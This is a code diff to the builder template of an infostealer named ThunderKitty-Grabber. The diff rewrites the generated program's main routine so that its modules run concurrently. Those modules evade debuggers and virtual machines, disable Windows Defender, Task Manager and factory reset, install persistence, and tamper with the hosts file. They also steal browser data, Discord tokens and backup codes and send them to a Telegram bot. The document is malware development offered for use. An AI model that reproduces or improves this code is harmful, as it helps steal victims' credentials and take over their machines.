@@ -58,6 +58,7 @@ import (
 	"ThunderKitty-Grabber/utils/wallpaperchanger"
 	"fmt"
 	"os/exec"
+	"sync"
 )
 
 const (
@@ -66,96 +67,175 @@ const (
 )
 
 func main() {
+	var wg sync.WaitGroup
+
  	if {{.EnableAntiDebug}} {
-		go AntiDebugVMAnalysis.ThunderKitty()
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			AntiDebugVMAnalysis.ThunderKitty()
+		}()
 	} else {
 		fmt.Println("Anti-debugging and VM analysis not enabled")
 	}
+
 	if {{.EnableFakeError}} {
-		go FakeError.Show()
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			FakeError.Show()
+		}()
 	} else {
 		fmt.Println("Fake error not enabled")
 	}
 
-	go Exclude.ExcludeDrive()
-	go Defender.Disable()
-	go Mutex.Create()
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		Exclude.ExcludeDrive()
+	}()
 
-	go SysInfo.Fetch(TelegramBotToken, TelegramChatId)
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		Defender.Disable()
+	}()
+
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		Mutex.Create()
+	}()
+
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		SysInfo.Fetch(TelegramBotToken, TelegramChatId)
+	}()
 
 	if {{.EnableBrowsers}} {
-		go browsers.ThunderKittyGrab(TelegramBotToken, TelegramChatId)
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			browsers.ThunderKittyGrab(TelegramBotToken, TelegramChatId)
+		}()
 	} else {
 		fmt.Println("Browser info grabbing not enabled")
 	}
 	
 	if {{.EnableTokenGrabber}} {
-		TokenGrabber.Run(TelegramBotToken, TelegramChatId, "{{.DMMessage}}")
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			TokenGrabber.Run(TelegramBotToken, TelegramChatId, "{{.DMMessage}}")
+		}()
 	} else {
 		fmt.Println("Discord token grabbing not enabled")
 	}
 
 	if {{.StealBackupCodes}} {
-		go BackupCodes.Search()
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			BackupCodes.Search()
+		}()
 	} else {
 		fmt.Println("Discord backup code recovery disabled")
 	}
 
 	if {{.DisableFactoryReset}} {
-		go FactoryReset.Disable()
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			FactoryReset.Disable()
+		}()
 	} else {
 		fmt.Println("Factory reset not disabled")
 	}
 
 	if {{.DisableTaskManager}} {
-		go TaskManager.Disable()
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			TaskManager.Disable()
+		}()
 	} else {
 		fmt.Println("Task manager not disabled")
 	}
 
 	if {{.EnablePersistence}} {
-		go Persistence.Create()
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			Persistence.Create()
+		}()
 	} else {
 		fmt.Println("Persistence not enabled")
 	}
 
 	if {{.BlockHostsFile}} {
-		go Hosts.Infect()
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			Hosts.Infect()
+		}()
 	} else {
 		fmt.Println("Block hosts file not enabled")
 	}
 	
-	url := "{{.OpenSiteURL}}"
-	if url != "" {
-		exec.Command("cmd.exe", "/c", "start", url).Run()
-	} else {
-		fmt.Println("Open website not enabled")
-	}
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		url := "{{.OpenSiteURL}}"
+		if url != "" {
+			exec.Command("cmd.exe", "/c", "start", url).Run()
+		} else {
+			fmt.Println("Open website not enabled")
+		}
+	}()
 	
-	ttsMessage := "{{.SpeakTTSMessage}}"
-	if ttsMessage != "" {
-		exec.Command("PowerShell", "-Command", "(New-Object -ComObject SAPI.SpVoice).Speak(\"" + ttsMessage + "\")").Run()
-	} else {
-		fmt.Println("TTS not enabled")
-	}
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		ttsMessage := "{{.SpeakTTSMessage}}"
+		if ttsMessage != "" {
+			exec.Command("PowerShell", "-Command", "(New-Object -ComObject SAPI.SpVoice).Speak(\"" + ttsMessage + "\")").Run()
+		} else {
+			fmt.Println("TTS not enabled")
+		}
+	}()
 
-	if {{.SwapMouse}} {
-		exec.Command("cmd", "/c", "rundll32.exe", "user32.dll,SwapMouseButton").Run()
-	} else {
-		fmt.Println("Swap mouse not enabled")
-	}
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		if {{.SwapMouse}} {
+			exec.Command("cmd", "/c", "rundll32.exe", "user32.dll,SwapMouseButton").Run()
+		} else {
+			fmt.Println("Swap mouse not enabled")
+		}
+	}()
 
 	if {{.PatchPowerShell}} {
-		go PowerShellPatcher.Patch()
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			PowerShellPatcher.Patch()
+		}()
 	} else {
 		fmt.Println("PowerShell patcher not enabled")
 	}
 
 	if {{.SetWallpaper}} {
-		WallpaperChanger.DownloadAndSetWallpaper()
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			WallpaperChanger.DownloadAndSetWallpaper()
+		}()
 	} else {
 		fmt.Println("Wallpaper changer not enabled")
 	}
+
+	wg.Wait()
 }
 `
 
@@ -360,7 +440,7 @@ func main() {
 		}
 
 		buildExecutable(cfg)
-		
+
 		// Save config
 		if err := SaveConfig(cfg); err != nil {
 			fmt.Println("Error saving config:", err)
